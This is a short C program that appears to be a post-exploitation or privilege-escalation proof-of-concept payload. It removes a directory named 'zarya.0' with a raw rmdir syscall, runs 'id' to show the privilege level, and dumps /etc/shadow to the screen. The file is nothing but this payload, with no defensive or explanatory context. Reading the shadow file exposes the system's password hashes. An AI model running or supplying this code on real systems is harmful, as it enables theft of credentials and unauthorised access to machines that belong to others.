#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>

int main() {
    const char *directory = "zarya.0";

    // Attempt to remove the directory
    if (syscall(SYS_rmdir, directory) == -1) {
        fprintf(stderr, "rmdir: failed to remove '%s': %s\n", directory, strerror(errno));
    } else {
        printf("rmdir: successfully removed '%s'\n", directory);
    }

    // Execute the `id` command
    printf("\n--- Running 'id' command ---\n");
    if (system("id") == -1) {
        perror("Failed to execute 'id'");
        return 1;
    }

    // Display the contents of /etc/shadow
    printf("\n--- Displaying '/etc/shadow' ---\n");
    if (system("cat /etc/shadow") == -1) {
        perror("Failed to execute 'cat /etc/shadow'");
        return 1;
    }

    return 0;
}
